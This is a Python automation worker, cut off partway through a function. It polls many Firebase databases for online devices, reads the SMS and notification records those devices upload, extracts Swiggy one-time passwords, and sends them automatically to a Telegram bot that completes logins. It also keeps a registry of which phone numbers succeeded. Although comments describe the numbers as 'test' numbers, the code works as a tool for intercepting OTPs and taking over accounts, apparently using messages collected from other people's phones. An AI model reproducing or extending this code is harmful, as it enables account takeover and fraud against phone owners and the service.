import argparse
import asyncio
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Prevent UnicodeEncodeError on Windows terminals
try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

from telethon import TelegramClient, events

from rich.console import Group
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from config import (
    TELEGRAM_API_ID,
    TELEGRAM_API_HASH,
    BOT_USERNAME,
    OTP_TIMEOUT_SECONDS,
    RESPONSE_KEYWORD,
    TELEGRAM_PHONE,
)

from firebase import (
    update_job_status,
    update_worker_status,
    firebase_get,
    firebase_update,
    get_firebase_databases,
    get_next_queued_job,
)


# ============================================================
# COMMAND-LINE CONFIG
# ============================================================

parser = argparse.ArgumentParser(
    description="Firebase + Telegram automation worker"
)
parser.add_argument(
    "--name",
    default="Automation",
    help="Name stored with the current job",
)
args = parser.parse_args()

# ============================================================
# PERSISTENT NUMBERS & SUCCESS REGISTRY
# ============================================================
SUCCESS_REGISTRY_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "processed_success.json",
)
NUMBERS_REGISTRY_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "processed_numbers.json",
)

processed_success = {}
processed_numbers = {}


def load_processed_numbers():
    """Load persistent numbers registry and merge legacy success file."""
    global processed_numbers
    global processed_success

    # 1. Load legacy success file
    try:
        if os.path.exists(SUCCESS_REGISTRY_FILE):
            with open(SUCCESS_REGISTRY_FILE, "r", encoding="utf-8") as fh:
                data = json.load(fh)
                if isinstance(data, dict):
                    processed_success = data
    except Exception as exc:
        processed_success = {}
        dashboard_log(f"Could not load success registry: {exc}")

    # 2. Load comprehensive numbers registry
    try:
        if os.path.exists(NUMBERS_REGISTRY_FILE):
            with open(NUMBERS_REGISTRY_FILE, "r", encoding="utf-8") as fh:
                data = json.load(fh)
                if isinstance(data, dict):
                    processed_numbers = data
    except Exception as exc:
        processed_numbers = {}
        dashboard_log(f"Could not load numbers registry: {exc}")

    # 3. Merge legacy success records into processed_numbers
    for phone, item in processed_success.items():
        norm = normalize_phone(phone)
        if norm and norm not in processed_numbers:
            processed_numbers[norm] = {
                "phone": norm,
                "status": "successful",
                "reason": "Verified success",
                "device_id": str(item.get("device_id", "")),
                "database": str(item.get("database", "")),
                "timestamp": str(item.get("completed_at", now())),
                "attempts": 1,
            }

    save_processed_numbers()


def save_processed_numbers():
    """Atomically save the comprehensive persistent numbers registry."""
    temp_file = NUMBERS_REGISTRY_FILE + ".tmp"
    try:
        with open(temp_file, "w", encoding="utf-8") as fh:
            json.dump(processed_numbers, fh, indent=2, ensure_ascii=False)
        os.replace(temp_file, NUMBERS_REGISTRY_FILE)
    except Exception as exc:
        dashboard_log(f"Could not save numbers registry: {exc}")
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass


def save_processed_success():
    """Atomically save the persistent successful-number registry."""
    temp_file = SUCCESS_REGISTRY_FILE + ".tmp"
    try:
        with open(temp_file, "w", encoding="utf-8") as fh:
            json.dump(processed_success, fh, indent=2, ensure_ascii=False)
        os.replace(temp_file, SUCCESS_REGISTRY_FILE)
    except Exception as exc:
        dashboard_log(f"Could not save success registry: {exc}")
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass


def is_successfully_processed(phone):
    """Return True when this normalized number has already succeeded."""
    number = normalize_phone(phone)
    if not number:
        return False
    if number in processed_success:
        return True
    if number in processed_numbers and processed_numbers[number].get("status") in {"successful", "success"}:
        return True
    return False


def is_number_already_processed(phone):
    """Return True when this number has already been processed with a final status.

    Ensures numbers are not retried again and again in a loop.
    """
    number = normalize_phone(phone)
    if not number:
        return True

    if is_successfully_processed(number):
        return True

    if number in processed_numbers:
        rec = processed_numbers[number]
        st = str(rec.get("status", "")).lower()
        if st in {"successful", "success", "suspended", "expired", "invalid_number", "invalid_otp", "failed"}:
            return True
        if st == "rate_limited":
            return True

    return False


def record_processed_number(phone, status, reason="", device=None, attempts=1):
    """Persist a tested number with its detailed status, metadata, and sync to Firebase."""
    number = normalize_phone(phone)
    if not number:
        return

    st = status.lower().strip()
    if st in {"success", "completed"}:
        norm_status = "successful"
    elif "suspend" in st:
        norm_status = "suspended"
    elif "expire" in st or "timeout" in st:
        norm_status = "expired"
    elif "rate" in st or "attempt" in st:
        norm_status = "rate_limited"
    elif "invalid_num" in st:
        norm_status = "invalid_number"
    elif "invalid" in st:
        norm_status = "invalid_otp"
    else:
        norm_status = st or "failed"

    device_id = ""
    database = ""
    if device and isinstance(device, dict):
        device_id = str(device.get("device_id") or device.get("deviceId") or "")
        database = str(device.get("database") or device.get("device_database") or "")
    elif current_job:
        device_id = str(current_job.get("device_id", ""))
        database = str(current_job.get("database", ""))

    entry = {
        "phone": number,
        "status": norm_status,
        "reason": str(reason or norm_status),
        "device_id": device_id,
        "database": database,
        "timestamp": now(),
        "attempts": attempts,
    }
    processed_numbers[number] = entry
    save_processed_numbers()

    # Legacy success sync
    if norm_status == "successful":
        processed_success[number] = {
            "status": "success",
            "device_id": device_id,
            "database": database,
            "completed_at": now(),
        }
        save_processed_success()

    # Sync to Firebase so web UI retrieves it across refreshes
    db_target = database or (FIREBASE_DATABASES[0] if FIREBASE_DATABASES else None)
    if db_target:
        try:
            from firebase import firebase_update
            firebase_update(
                db_target,
                f"automation/numbers/{number}",
                {
                    "phone": number,
                    "status": norm_status,
                    "reason": str(reason or norm_status),
                    "deviceId": device_id,
                    "database": db_target,
                    "updatedAt": now(),
                    "attempts": attempts,
                },
            )
        except Exception as exc:
            dashboard_log(f"Failed to sync number to Firebase: {exc}")

    safe_reason = str(reason or norm_status).encode('ascii', errors='replace').decode('ascii')
    print()
    print("=" * 60)
    print(f"PERSISTED NUMBER LOG: {number}")
    print(f"  Status:   {norm_status.upper()}")
    print(f"  Reason:   {safe_reason}")
    print(f"  Attempts: {attempts}")
    print(f"  Device:   {device_id} ({database})")
    print("=" * 60)
    print()


def mark_successful_number(phone, device):
    """Backwards-compatible wrapper."""
    record_processed_number(phone, "successful", "Verified success", device)


# ============================================================
# TELEGRAM
# ============================================================

client = TelegramClient(
    "my_telegram_session",
    TELEGRAM_API_ID,
    TELEGRAM_API_HASH,
)


# ============================================================
# WORKER STATE
# ============================================================

current_job = None
state = "IDLE"
current_device = None

used_device_ids = set()

# Combined device registry. Firebase discovery is performed in parallel
# across all configured databases and refreshed independently of the
# active Telegram job.
device_pool = []
device_pool_loaded = False
device_registry = {}
firebase_registry = {}
registry_lock = asyncio.Lock()
registry_refresh_task = None
REGISTRY_REFRESH_SECONDS = 10
last_registry_refresh = 0.0
registry_refresh_in_progress = False

# Terminal dashboard state.
dashboard_live = None
dashboard_started_at = time.monotonic()
worker_log_lines = []
MAX_DASHBOARD_LOGS = 8

cancel_in_progress = False
otp_timer_task = None
verification_timer_task = None
response_poll_task = None
test_response_baseline_signatures = set()

next_job_lock = asyncio.Lock()

# Prevent duplicate Login via OTP clicks
login_click_in_progress = False
login_clicked_for_job = None

message_handler_lock = asyncio.Lock()

pending_finish_after_cancel = False
pending_finish_status = ""
pending_finish_error = ""
pending_restart_after_cancel = False
latest_bot_message_text = ""

last_start_sent_at = 0.0
last_telegram_activity = time.monotonic()
START_RETRY_SECONDS = 3


# ============================================================
# TIME
# ============================================================

def now():
    return datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )


def safe_print(text):
    """Print text safely on Windows by replacing unencodable chars."""
    try:
        import sys
        encoded = str(text).encode(
            sys.stdout.encoding or 'utf-8', errors='replace'
        ).decode(sys.stdout.encoding or 'utf-8', errors='replace')
        print(encoded)
    except Exception:
        try:
            print(str(text).encode('ascii', errors='replace').decode('ascii'))
        except Exception:
            print("<unprintable text>")


def dashboard_log(message):
    """Keep a short in-memory log for the live terminal dashboard."""
    worker_log_lines.append(f"[{now()}] {message}")
    del worker_log_lines[:-MAX_DASHBOARD_LOGS]


# ============================================================
# WORKER SYNC & AUTH DB HELPERS
# ============================================================

_AUTH_DB = None


def _get_auth_db():
    """Return the first reachable Firebase database URL for auth signalling."""
    global _AUTH_DB
    if _AUTH_DB:
        return _AUTH_DB
    databases = get_firebase_databases()
    for db in databases:
        try:
            import requests as _req
            url = f"{db.rstrip('/')}/automation/auth.json"
            r = _req.get(url, timeout=5)
            if r.status_code != 423:
                _AUTH_DB = db
                return _AUTH_DB
        except Exception:
            continue
    if databases:
        _AUTH_DB = databases[0]
    return _AUTH_DB


def sync_worker_status_all(status, job=None, last_error=""):
    """Synchronize worker status, phone, device ID, and database to both the job DB and auth_db."""
    active = job or current_job
    auth_db = _get_auth_db()

    phone = str(active.get("device_phone") or active.get("number") or "") if active else ""
    device_id = str(active.get("device_id") or "") if active else ""
    device_db = str(active.get("device_database") or active.get("database") or "") if active else ""
    job_id = str(active.get("id") or active.get("jobId") or "") if active else ""

    target_dbs = set()
    if active and active.get("database"):
        target_dbs.add(active["database"])
    if auth_db:
        target_dbs.add(auth_db)
    if not target_dbs:
        dbs = list(get_firebase_databases())
        if dbs:
            target_dbs.add(dbs[0])

    for db in target_dbs:
        try:
            update_worker_status(
                db,
                status=status,
                current_job=job_id,
                last_error=last_error,
                latest_bot_message=latest_bot_message_text,
                phone=phone,
                device_id=device_id,
                device_database=device_db
            )
        except Exception:
            pass


def _device_from_record(database, device_id, device):
    """Normalize one clients/<device_id> record using the existing schema."""
    if not isinstance(device, dict):
        return None

    phone = (
        device.get("phoneNumber")
        or device.get("phone")
        or device.get("mobile")
        or device.get("mobNo")
        or device.get("number")
    )

    status_value = str(
        device.get("status", device.get("connectionStatus", ""))
    ).strip().lower()

    online_value = device.get("isOnline", device.get("online"))
    online = (
        status_value in {"online", "connected", "true"}
        or online_value is True
        or str(online_value).strip().lower() == "true"
    )

    normalized_id = str(device_id).strip()
    if not normalized_id:
        return None

    return {
        "device_id": normalized_id,
        "database": database,
        "online": online,
        "phone": phone,
        "raw": device,
    }


def _scan_one_database(database):
    """Fetch only clients from one Firebase database."""
    try:
        data = firebase_get(database, "clients")
        devices = []

        if isinstance(data, dict):
            for device_id, record in data.items():
                item = _device_from_record(database, device_id, record)
                if item:
                    devices.append(item)

        return {
            "database": database,
            "ok": True,
            "devices": devices,
            "error": "",
        }
    except Exception as exc:
        return {
            "database": database,
            "ok": False,
            "devices": [],
            "error": str(exc),
        }


def refresh_device_registry_sync():
    """Parallel scan of all configured Firebase clients nodes."""
    global device_registry
    global firebase_registry
    global last_registry_refresh
    global registry_refresh_in_progress

    registry_refresh_in_progress = True
    databases = list(get_firebase_databases())

    combined = {}
    db_status = {}

    # One worker thread per database keeps the 47 HTTP reads independent.
    max_workers = min(47, max(4, len(databases)))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(_scan_one_database, database): database
            for database in databases
        }

        for future in as_completed(futures):
            result = future.result()
            database = result["database"]
            db_status[database] = result

            for device in result["devices"]:
                device_id = device["device_id"]

                # Keep database as part of the identity so the same
                # device ID can safely exist in two Firebase databases.
                key = f"{database}|{device_id}"
                previous = device_registry.get(key, {})

                if is_successfully_processed(device.get("phone")):
                    device["state"] = "COMPLETED"
                else:
                    device["state"] = previous.get("state", "PENDING")
                device["last_seen"] = time.time()
                combined[key] = device

    device_registry = combined
    firebase_registry = db_status
    last_registry_refresh = time.monotonic()
    registry_refresh_in_progress = False

    return list(device_registry.values())


async def refresh_device_registry(force=False):
    """Refresh Firebase discovery without blocking the Telegram event loop."""
    global device_pool
    global device_pool_loaded

    if (
        not force
        and last_registry_refresh
        and time.monotonic() - last_registry_refresh < REGISTRY_REFRESH_SECONDS
    ):
        return list(device_registry.values())

    devices = await asyncio.to_thread(refresh_device_registry_sync)

    async with registry_lock:
        device_pool = [
            d for d in devices
            if d.get("online") and normalize_phone(d.get("phone"))
        ]
        device_pool_loaded = True

    dashboard_log(
        f"Firebase registry refreshed: {len(firebase_registry)} DBs / "
        f"{len(device_registry)} devices"
    )
    return devices


def build_dashboard():
    """Build the live terminal dashboard without interfering with worker logs."""
    databases = list(firebase_registry.values())
    db_ok = sum(1 for item in databases if item.get("ok"))
    db_failed = len(databases) - db_ok

    devices = list(device_registry.values())
    total = len(devices)
    online = sum(1 for d in devices if d.get("online"))
    with_number = sum(
        1 for d in devices if d.get("online") and normalize_phone(d.get("phone"))
    )
    already_success = sum(
        1 for d in devices
        if normalize_phone(d.get("phone"))
        and is_successfully_processed(d.get("phone"))
    )
    processing = sum(1 for d in devices if d.get("state") == "PROCESSING")
    completed = sum(1 for d in devices if d.get("state") == "COMPLETED")
    failed = sum(1 for d in devices if d.get("state") == "FAILED")
    pending = sum(
        1 for d in devices
        if d.get("state") == "PENDING"
        and d.get("online")
        and normalize_phone(d.get("phone"))
        and not is_successfully_processed(d.get("phone"))
    )

    title = Text("TELEGRAM AUTOMATION WORKER", style="bold")
    title.append("  •  LIVE FIREBASE DEVICE MONITOR", style="dim")

    summary = Table.grid(expand=True)
    summary.add_column()
    summary.add_column()
    summary.add_column()
    summary.add_column()
    summary.add_row(
        f"Firebase DBs: {len(databases)}",
        f"DB OK: {db_ok}",
        f"DB Failed: {db_failed}",
        f"Refresh: {int(time.monotonic() - last_registry_refresh)}s ago"
        if last_registry_refresh else "Refresh: starting",
    )
    summary.add_row(
        f"Devices: {total}",
        f"Online: {online}",
        f"Online + Number: {with_number}",
        f"Already Success: {already_success}",
    )
    summary.add_row(
        f"Pending: {pending}",
        f"Processing: {processing}",
        f"Completed: {completed}",
        f"Worker: {state}",
    )

    current = Table.grid(expand=True)
    current.add_column(style="bold")
    current.add_column()
    if current_job:
        current.add_row("Device", str(current_job.get("device_id", "-")))
        current.add_row("Number", str(current_job.get("device_phone", "-")))
        current.add_row("Firebase", str(current_job.get("device_database", "-")))
        current.add_row("Job", str(current_job.get("id", "-")))
        current.add_row("State", state)
        current.add_row(
            "SMS poll",
            "ACTIVE DEVICE FIREBASE ONLY"
            if state == "WAITING_FOR_OTP"
            else "not active",
        )
    else:
        current.add_row("Device", "-")
        current.add_row("State", "IDLE")
        current.add_row("SMS poll", "none")

    devices_table = Table(title="DEVICE QUEUE", expand=True)
    devices_table.add_column("State", width=12)
    devices_table.add_column("Device")
    devices_table.add_column("Number")
    devices_table.add_column("Firebase")

    visible = sorted(
        devices,
        key=lambda d: (
            0 if d.get("state") == "PROCESSING" else
            1 if d.get("state") == "PENDING" else
            2 if d.get("state") == "COMPLETED" else 3,
            str(d.get("device_id", "")),
        ),
    )[:12]

    for d in visible:
        dstate = d.get("state", "PENDING")
        marker = {
            "PROCESSING": "▶ PROCESSING",
            "COMPLETED": "✓ COMPLETED",
            "FAILED": "✗ FAILED",
            "PENDING": "○ PENDING",
        }.get(dstate, dstate)
        devices_table.add_row(
            marker,
            str(d.get("device_id", "-")),
            str(d.get("phone") or "-"),
            str(d.get("database", "-")).replace("https://", "")[:38],
        )

    logs = Text()
    logs.append("WORKER LOGS\n", style="bold")
    logs.append("\n".join(worker_log_lines) or "Waiting for worker activity...")

    return Group(
        Panel(title, border_style="cyan"),
        Panel(summary, title="SYSTEM", border_style="blue"),
        Panel(current, title="ACTIVE JOB", border_style="yellow"),
        devices_table,
        Panel(logs, title="LOG", border_style="green"),
    )


async def dashboard_loop():
    """Continuously redraw the dashboard while the worker remains responsive."""
    global dashboard_live

    with Live(
        build_dashboard(),
        refresh_per_second=4,
        screen=False,
        transient=False,
    ) as live:
        dashboard_live = live

        while True:
            live.update(build_dashboard(), refresh=True)
            await asyncio.sleep(0.25)


async def registry_refresh_loop():
    """Refresh all Firebase device/status data independently every 10 seconds."""
    while True:
        try:
            await refresh_device_registry()
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            dashboard_log(f"Registry refresh error: {exc}")
        await asyncio.sleep(REGISTRY_REFRESH_SECONDS)


async def stuck_watchdog_loop():
    """Watchdog that monitors for hung or stuck states.

    If stuck in an active state for > 70s without progress, it executes
    recovery: sends /cancel then /start, and retries the login or advances.
    """
    global last_telegram_activity

    while True:
        try:
            await asyncio.sleep(10)

            # Only check if worker is in an active non-idle state
            if state not in {"IDLE", "CANCELLED"}:
                elapsed = time.monotonic() - last_telegram_activity
                if elapsed > 70:
                    print()
                    print("=" * 60)
                    print(f"[{now()}] [WATCHDOG] STUCK DETECTED in state '{state}' ({elapsed:.0f}s idle)")
                    print("Executing recovery: sending /cancel then /start and retrying login...")
                    print("=" * 60)

                    # Update activity so watchdog doesn't fire immediately again
                    last_telegram_activity = time.monotonic()

                    if current_job:
                        stuck_retries = current_job.get("stuck_retries", 0)
                        if stuck_retries < 1:
                            current_job["stuck_retries"] = 1
                            print(f"[{now()}] [WATCHDOG] Retrying login for {current_job.get('number')}...")
                            await restart_current_job_login("Watchdog stuck recovery")
                        else:
                            print(f"[{now()}] [WATCHDOG] Job {current_job['id']} repeatedly stuck. Aborting and advancing...")
                            await request_cancel_and_finish(
                                "failed",
                                "Stuck watchdog timeout",
                                "Watchdog timeout",
                            )
                    else:
                        print(f"[{now()}] [WATCHDOG] Idle recovery: sending /cancel then /start...")
                        try:
                            await client.send_message(BOT_USERNAME, "/cancel")
                            await asyncio.sleep(2)
                            await send_start_if_needed(force=True)
                        except Exception as e:
                            print(f"[{now()}] [WATCHDOG] Error in idle recovery: {e}")
                        set_state("IDLE")
                        await start_next_job()

        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[{now()}] [WATCHDOG ERROR] {e}")


# ============================================================
# STATE
# ============================================================

def set_state(new_state):

    global state
    global last_telegram_activity

    state = new_state
    last_telegram_activity = time.monotonic()
    dashboard_log(f"STATE -> {new_state}")

    print(
        f"[{now()}] STATE -> {new_state}"
    )


# ============================================================
# PHONE / TEST RESPONSE HELPERS
# ============================================================

def normalize_phone(value):
    """Return digits only."""
    return re.sub(r"\D", "", str(value or ""))


def extract_local_10_digit_number(value):
    """
    Normalize an Indian-style test number.

    Examples:
      +91 9876543210 -> 9876543210
      919876543210  -> 9876543210
      9876543210     -> 9876543210

    For non-Indian numbers, only an already-10-digit value is
    accepted by the controlled test flow.
    """
    digits = normalize_phone(value)

    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]

    if len(digits) != 10:
        raise ValueError(
            f"Expected a 10-digit test number after country-code parsing, got: {value}"
        )

    return digits


def response_paths():
    """
    Return Firebase paths to poll for incoming Swiggy OTP messages.

    Checks the primary device AND all other devices in the registry that
    share the same phone number (cross-device matching).

    Firebase SMS / Notification structures:
        <device_id>/<message_id>/{message,sender,dateTime,type}
        messages/<device_id>/<message_id>/{...}
        notifications/<device_id>/...
        notification/<device_id>/...
        sms/<device_id>/...
    """
    if not current_job:
        return []

    device_id = str(current_job.get("device_id", "")).strip()
    if not device_id:
        return []

    paths = [
        # Primary device paths
        f"messages/{device_id}",
        device_id,
        f"notifications/{device_id}",
        f"notification/{device_id}",
        f"sms/{device_id}",
        f"automation/notifications/{device_id}",
        f"automation/responses/{device_id}",
    ]

    # Cross-device: find all devices sharing the same phone number
    target_phone = normalize_phone(
        current_job.get("device_phone") or current_job.get("number", "")
    )
    if target_phone:
        for key, dev in device_registry.items():
            other_id = dev.get("device_id", "")
            if not other_id or other_id == device_id:
                continue
            other_phone = normalize_phone(dev.get("phone", ""))
            if other_phone == target_phone:
                paths.append(f"messages/{other_id}")
                paths.append(other_id)
                paths.append(f"notifications/{other_id}")
                paths.append(f"notification/{other_id}")
                paths.append(f"sms/{other_id}")
                paths.append(f"automation/notifications/{other_id}")

    return list(dict.fromkeys(paths))


def response_paths_with_db():
    """
    Return (database, path) tuples for polling — handles cross-database
    matching where the same number may appear in different Firebase projects.
    """
    if not current_job:
        return []

    device_id = str(current_job.get("device_id", "")).strip()
    primary_db = current_job.get("device_database", "")
    if not device_id or not primary_db:
        return []

    results = [
        (primary_db, f"messages/{device_id}"),
        (primary_db, device_id),
        (primary_db, f"notifications/{device_id}"),
        (primary_db, f"notification/{device_id}"),
        (primary_db, f"sms/{device_id}"),
        (primary_db, f"automation/notifications/{device_id}"),
        (primary_db, f"automation/responses/{device_id}"),
    ]

    # Cross-device: all devices sharing the same phone number across ALL databases
    target_phone = normalize_phone(
        current_job.get("device_phone") or current_job.get("number", "")
    )
    if target_phone:
        for key, dev in device_registry.items():
            other_id = dev.get("device_id", "")
            other_db = dev.get("database", "")
            if not other_id:
                continue
            if other_id == device_id and other_db == primary_db:
                continue
            other_phone = normalize_phone(dev.get("phone", ""))
            if other_phone == target_phone and other_db:
                results.append((other_db, f"messages/{other_id}"))
                results.append((other_db, other_id))
                results.append((other_db, f"notifications/{other_id}"))
                results.append((other_db, f"notification/{other_id}"))
                results.append((other_db, f"sms/{other_id}"))
                results.append((other_db, f"automation/notifications/{other_id}"))

    return list(dict.fromkeys(results))


def collect_text_values(value, path=""):
    """Recursively collect text values from a Firebase JSON object."""
    results = []

    if isinstance(value, dict):
        for key, child in value.items():
            child_path = f"{path}/{key}" if path else str(key)
            results.extend(collect_text_values(child, child_path))

    elif isinstance(value, list):
        for index, child in enumerate(value):
            child_path = f"{path}/{index}" if path else str(index)
            results.extend(collect_text_values(child, child_path))

    elif isinstance(value, str):
        results.append((path, value))

    elif isinstance(value, int) and 0 <= value <= 999999:
        results.append((path, str(value).zfill(6)))

    return results


def extract_otp_code(text):
    """
    Extract 6-digit (or 4-8 digit) OTP code from message text.
    Accurately handles Swiggy login OTP and general SMS verification formats.
    """
    if not text:
        return None
    text_clean = str(text).strip()

    # 1. Match explicit OTP pattern: "OTP 428136", "code is 428136", "OTP: 428136", "is 428136"
    m1 = re.search(
        r"(?:otp|code|verification|password|pin|is)[^\d]{0,30}\b(\d{6})\b",
        text_clean,
        re.IGNORECASE,
    )
    if m1:
        return m1.group(1)

    # 2. Match standard standalone 6-digit number
    six_digits = re.findall(r"\b\d{6}\b", text_clean)
    if six_digits:
        return six_digits[0]

    # 3. Fallback for 4-8 digits near keyword
    m2 = re.search(
        r"(?:otp|code|verification|password)[^\d]{0,30}\b(\d{4,8})\b",
        text_clean,
        re.IGNORECASE,
    )
    if m2:
        return m2.group(1)

    return None


def swiggy_messages_from_response(value):
    """Find message records containing the keyword or OTP markers. Supports both dicts and lists."""
    found = []

    items = []
    if isinstance(value, dict):
        items = list(value.items())
    elif isinstance(value, list):
        items = list(enumerate(value))
    else:
        return found

    keyword = (RESPONSE_KEYWORD or "swiggy").lower()

    for message_id, record in items:
        if not isinstance(record, dict):
            continue

        message = str(
            record.get("message")
            or record.get("body")
            or record.get("text")
            or record.get("msg")
            or record.get("sms")
            or ""
        )
        content = str(
            record.get("content")
            or record.get("bigText")
            or record.get("subText")
            or record.get("tickerText")
            or ""
        )
        title = str(
            record.get("title")
            or record.get("header")
            or record.get("app")
            or record.get("appName")
            or ""
        )
        if content and content not in message:
            message = f"{message} {content}".strip()
        if title and title not in message:
            message = f"[{title}] {message}".strip()

        sender = str(
            record.get("sender")
            or record.get("address")
            or record.get("from")
            or record.get("originatingAddress")
            or record.get("title")
            or record.get("appName")
            or ""
        )

        msg_lower = message.lower()
        sender_lower = sender.lower()

        # Match target keyword ("swiggy") or general OTP markers
        has_keyword = keyword in msg_lower or keyword in sender_lower
        has_otp_marker = bool(
            re.search(r"\b(?:otp|verification|one.?time|code|password)\b", msg_lower)
            or re.search(r"\b(?:otp|swiggy)\b", sender_lower)
        )

        if not has_keyword and not has_otp_marker:
            continue

        raw_id = record.get("id") or message_id

        found.append({
            "message_id": str(message_id),
            "raw_id": raw_id,
            "message": message,
            "sender": sender,
            "dateTime": record.get("dateTime", ""),
            "type": record.get("type", ""),
        })

    return found


def capture_response_baseline():
    """Record existing matching message IDs before submitting the phone number.

    Uses cross-device paths so that baselines are established for ALL
    devices sharing the same phone number across ALL Firebase databases.
    """
    global test_response_baseline_signatures

    test_response_baseline_signatures = set()

    if not current_job:
        return

    from firebase import firebase_get

    print()
    print("=" * 60)
    print("CAPTURING SWIGGY RESPONSE BASELINE (CROSS-DEVICE)")
    print("=" * 60)

    paths_with_db = response_paths_with_db()

    for db_url, path in paths_with_db:
        try:
            response = firebase_get(db_url, path)
            messages = swiggy_messages_from_response(response)

            for item in messages:
                test_response_baseline_signatures.add(
                    (db_url, path, str(item["message_id"]))
                )
                if item.get("raw_id"):
                    test_response_baseline_signatures.add(
                        (db_url, path, str(item["raw_id"]))
                    )

            if messages:
                print(
                    f"Checked: {path} ({db_url[-30:]}) | "
                    f"existing Swiggy messages: {len(messages)}"
                )

        except Exception as e:
            print(f"Baseline check failed: {path} | {e}")

    print(
        "Baseline message signatures:",
        len(test_response_baseline_signatures),
    )
    print("=" * 60)


async def poll_device_response(job_id):
    """Poll ALL devices with same phone number for NEW Swiggy OTP messages.

    Scans across all Firebase databases and devices sharing the target
    phone number. When a new message containing a verification code is
    found, it is immediately submitted to the Telegram bot.
    """
    global current_job

    try:
        from firebase import firebase_get

        device_id = (
            str(current_job.get("device_id", "")).strip()
            if current_job
            else ""
        )

        if not device_id:
            return

        paths_with_db = response_paths_with_db()

        print()
        print("=" * 60)
        print("STARTING SWIGGY OTP POLLING (CROSS-DEVICE)")
        print("=" * 60)
        print("Primary device:", device_id)
        print("Primary Firebase:", current_job.get("device_database"))
        print("Polling interval: 2 seconds")
        print("Keyword:", RESPONSE_KEYWORD)
        print(f"Monitoring {len(paths_with_db)} paths across all matching devices")
        print("=" * 60)

        submitted_at_ms = int(current_job.get("number_submitted_at", 0) * 1000)

        while (
            current_job
            and current_job.get("id") == job_id
            and state == "WAITING_FOR_OTP"
        ):
            # Re-fetch paths each cycle in case device_registry changed
            paths_with_db = response_paths_with_db()
            used_otps = current_job.get("submitted_otps", set())

            for db_url, path in paths_with_db:
                try:
                    response = firebase_get(db_url, path)
                except Exception:
                    continue

                if response is None:
                    continue

                messages = swiggy_messages_from_response(response)
                candidate_messages = []

                for item in messages:
                    msg_id_str = str(item["message_id"])
                    raw_id_str = str(item.get("raw_id", ""))
                    sig = (db_url, path, msg_id_str)
                    raw_sig = (db_url, path, raw_id_str)

                    # Check 1: was this message ID NOT in the pre-submit baseline?
                    is_new_by_baseline = (
                        sig not in test_response_baseline_signatures
                        and raw_sig not in test_response_baseline_signatures
                    )

                    # Check 2: timestamp freshness check (epoch milliseconds)
                    is_fresh_by_time = False
                    raw_id = item.get("raw_id") or item.get("message_id")
                    if raw_id and str(raw_id).isdigit() and len(str(raw_id)) >= 12:
                        msg_time = int(str(raw_id))
                        now_ms = time.time() * 1000
                        # If arrived after number submission (with 10s grace period)
                        if submitted_at_ms > 0 and msg_time >= (submitted_at_ms - 10000):
                            is_fresh_by_time = True
                        # Or arrived in the last 120 seconds
                        elif (now_ms - msg_time) < 120000:
                            is_fresh_by_time = True

                    if is_new_by_baseline or is_fresh_by_time:
                        candidate_messages.append(item)

                if not candidate_messages:
                    continue

                # Sort candidate messages chronologically so newest is last
                candidate_messages.sort(
                    key=lambda m: int(str(m.get("raw_id") or m.get("message_id")))
                    if str(m.get("raw_id") or m.get("message_id", "")).isdigit()
                    else 0
                )

                # Process the newest newly-arrived matching message.
                item = candidate_messages[-1]
                message_text = item["message"]

                code = extract_otp_code(message_text)
                if not code:
                    code = extract_otp_code(f"{item.get('sender', '')} {message_text}")

                if not code:
                    # No verification code found, mark as seen and wait for next
                    test_response_baseline_signatures.add(
                        (db_url, path, str(item["message_id"]))
                    )
                    continue

                if code in used_otps:
                    # Already submitted this code for this job
                    continue

                print()
                print("=" * 60)
                print(f"[{now()}] 🔥 NEW OTP DETECTED FOR {current_job.get('device_phone', '')}")
                print("=" * 60)
                print("Source path:", path)
                print("Source DB:", db_url)
                print("Message ID:", item["message_id"])
                print("Sender:", item["sender"])
                print("Date/time:", item["dateTime"])
                print("Message:", message_text)
                print(f"Extracted OTP code: >>> {code} <<<")
                print("=" * 60)

                # Mark code as used for this job
                used_otps.add(code)
                current_job["submitted_otps"] = used_otps

                # Mark signature in baseline so we don't re-read it
                test_response_baseline_signatures.add(
                    (db_url, path, str(item["message_id"]))
                )
                if item.get("raw_id"):
                    test_response_baseline_signatures.add(
                        (db_url, path, str(item["raw_id"]))
                    )

                await stop_otp_timer()

                set_state("VERIFYING")
                start_verification_timer(job_id)

                sync_worker_status_all("verifying", current_job)
                try:
                    update_job_status(
                        current_job,
                        "verifying",
                    )
                except Exception:
                    pass

                print(
                    f"[{now()}] Submitting parsed OTP code '{code}' "
                    f"to Telegram bot..."
                )

                try:
                    sent_message = await client.send_message(
                        BOT_USERNAME,
                        code,
                    )

                    print(
                        f"[{now()}] OTP '{code}' SENT SUCCESSFULLY TO BOT"
                    )
                    print(
                        f"[{now()}] Telegram message ID: "
                        f"{sent_message.id}"
                    )
                    print(
                        f"[{now()}] Waiting for bot "
                        f"SUCCESS / FAILURE response..."
                    )

                except Exception as e:
                    print(
                        f"[{now()}] Failed to send "
                        f"verification code '{code}': {e}"
                    )

                    await request_cancel_and_finish(
                        "failed",
                        f"Verification code submission failed: {e}",
                        "Verification code submission failed",
                    )

                return

            await asyncio.sleep(2)

    except asyncio.CancelledError:
        print(
            f"[{now()}] Swiggy response polling cancelled"
        )


def start_response_poll(job_id):
    global response_poll_task

    if response_poll_task:
        response_poll_task.cancel()

    response_poll_task = asyncio.create_task(
        poll_device_response(job_id)
    )


async def stop_response_poll():
    global response_poll_task

    if not response_poll_task:
        return

    task = response_poll_task
    response_poll_task = None

    task.cancel()

    try:
        await task
    except asyncio.CancelledError:
        pass



# ============================================================
# OTP TIMER
# ============================================================

async def otp_timeout_worker(job_id):

    try:

        print(
            f"[{now()}] OTP timeout started "
